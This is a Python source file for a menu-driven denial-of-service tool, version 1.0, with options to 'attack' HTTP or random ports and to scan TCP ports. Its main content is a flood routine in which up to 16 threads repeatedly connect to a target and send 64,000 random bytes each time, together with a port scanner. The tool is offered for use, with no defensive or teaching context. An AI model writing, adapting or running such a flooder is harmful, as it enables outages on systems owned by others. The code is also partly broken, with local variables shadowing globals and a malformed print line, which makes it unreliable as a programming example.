import requests,time,socket,random,threading,os,sys
from datetime import datetime
sl = 0
global op

url = ""
threads = 0
def getIp(domain):
    try:
        now = datetime.now();
        hour = now.hour;
        minute = now.minute;
        second = now.second;
        h = socket.gethostbyname(domain)
        print(f"[{hour}]:[{minute}]:[{second}] INFO: Using IP {h} of hostname '"+domain+"'.")
        return h
    except:
        now = datetime.now();
        hour = now.hour;
        minute = now.minute;
        second = now.second;
        exit(f"[{hour}]:[{minute}]:[{second}] ERROR: Failed to get ip by '"+domain+"' hostaname!")
def verifyports(url,max = False):
    ip = getIp(url)
    p = 0
    print("_______________________")
    scaneds = 0
    if max:
        p = 65535
    else:
        p = 1000
    for porta in range(p):
        port = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        port.settimeout(0.1);
        opened = port.connect_ex((ip, porta));
        if opened == 0:
            scaneds += 1;
            print(porta, "OPEN"); 
    print("_______________________")
def scanMenu():
    print("_______________________")
    print("")
    print("""
    Options:
        [1] - Set to max port
        [2] - Set URL
        [3] - Scan
    """)
    print("_______________________")
    print("")
    try:
        max_p = False
        url = ""
        while True:
            op = int(input("--> "))
            if(op > 3):
                print("[INFO] Invalid option please try again!")
            if(op == 1):
                max_p = False if max_p else True
                print("[INFO] Scan max port set to "+str(max_p))
            if(op == 2):
                url = input("[URL] --> ")
                if(url == ""):
                    print("[INFO] the url is empty!")
                else:
                    print("[INFO] URL set to "+url)
            if(op == 3):
                if(url == ""):
                    print("[INFO] Set the URL!")
                else:
                    verifyports(url,max_p)
    except:
            print("[INFO] Invalid option please try again!")
def httpMenu():
    print("_______________________")
    print("""

    Configuration:

        [1] - Set the URL!
        [2] - Set number of Threads!

    Options:

        [1] - Set URL
        [2] - Set Threads number
        [3] - Start attack
        [4] - Go to Main menu
    """)
    print("_______________________")
    print("")
    try:
        while True:
            op = int(input("--> "))
            if op == 1:
                url = input('Set url --> ')
            if op == 2:
                threads = int(input('Set threads --> '))
                if(threads > 16):
                    print("[INFO] MAx limit of thread is 16.")
                    threads = 16
            if(op > 4):
                print("[INFO] Invalid option please try again!")
            elif op == 3:
                if(url == ""):
                    print("[INFO] Url is not defined please set Url!")
                    
                elif threads == 0:
                    print("[INFO] Threads number is not defined please ser threads!")
                else:
                    break
            elif op == 4:
                time.sleep(2)
                if os.name == 'nt':
                    os.system("cls")
                else:
                    os.system("clear")
                mainMenu()

            

    except:
            print("[INFO] Invalid options please try again!")
    attack(url,threads,80)
def randomPortMenu():
    print("_______________________")
    print("")
    print("""
    Configuration:

        [1] - Set the URL!
        [2] - Set the number of Threads!

    Options:
        [1] - Set URL
        [2] - Set Threads number
        [3] - Start attack
        [4] - Go to Main menu
    """)
    print("_______________________")
    print("")
    try:
        while True:
            op = int(input("--> "))
            if op == 1:
                url = input('Set url --> ')
            if op == 2:
                threads = int(input('Set threads --> '))
                if(threads > 16):
                    print("[INFO] Max limit of thread is 16!")
                    threads = 16
            if(op > 4):
                print("[INFO] Invalid option please try again!")
            elif op == 3:
                if(url == ""):
                    print("[INFO] Url is not defined please set Url!")
                    
                elif threads == 0:
                    print("[INFO] Threads number is not defined please ser threads!")
                else:
                    if os.name == 'nt':
                        os.system("cls")
                    else:
                        os.system("clear")
                        break
                        
            elif op == 4:
                time.sleep(2)
                if os.name == 'nt':
                    os.system("cls")
                else:
                    os.system("clear")
                mainMenu()
            

    except:
            print("[INFO] Invalid option please try again!")
    attack(url,threads)

def mainMenu():
    print("_______________________")
    print("")
    print("Creators:")
    print(")
    print('Emanuel and Drako')
    print("")
    print('Version: v1.0')
    print("UpdateData: 05/04/2021")
    print("_______________________")
    time.sleep(2)
    if os.name == 'nt':
        os.system("cls")
    else:
        os.system("clear")
    print("_______________________")
    print("")
    print("""Options:

    [1] - Attack http or https ports
    [2] - Attack random ports
    [3] - Port sccan
    [4] - Exit
    """)
    print("_______________________")
    print("")
    while True:
        try:
            op = int(input("--> "))
            if(op > 4):
                print("[INFO] Invalid option please try again!")
            elif op == 1:
                time.sleep(2)
                if os.name == 'nt':
                    os.system("cls")
                else:
                    os.system("clear")
                httpMenu()
            elif op == 2:
                time.sleep(2)
                if os.name == 'nt':
                    os.system("cls")
                else:
                    os.system("clear")
                randomPortMenu()
            elif op == 3:
                time.sleep(2)
                if os.name == 'nt':
                    os.system("cls")
                else:
                    os.system("clear")
                scanMenu()
            elif op == 4:
                print("Bye")
                break

        except:
            print("[INFO] Invalid options please try again!")
    
def getRandomPort():
    p =  random.randint(1,65535)
    now = datetime.now();
    hour = now.hour;
    minute = now.minute;
    second = now.second;
    print(f"[{hour}]:[{minute}]:[{second}] INFO: Using port {p} to attack with 64000 bytes.")
    return p
def attack(host,threads, port = getRandomPort()):
    ip = getIp(host)

    threadList = []
    for i in range(threads):
        t = threading.Thread(target=connect,args=(ip,port))
        t.start()
        threadList.append(t)
    t = threading.Thread(target=pr)
    t.start()
    threadList.append(t)
def connect(ip,port):
    global sl
    while True:

        bytes = random._urandom(64000)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            sl += 1
            now = datetime.now();
            hour = now.hour;
            minute = now.minute;
            second = now.second;
            s.connect((ip,port))
            s.send(bytes)
            s.close()
        except:
            pass
def pr():
    global sl
    
    now = datetime.now();
    hour = now.hour;
    minute = now.minute;
    second = now.second
    print(f"[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")
    timemsg = now.second + 3;

    while True:
        now = datetime.now();
        second = now.second;
        if timemsg > 60:
            timemsg = 0;

        
        atual = now.second;
        hour = now.hour;
        minute = now.minute;
        if atual == timemsg:
            timemsg = now.second + 3;
            print(f"[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")
mainMenu()
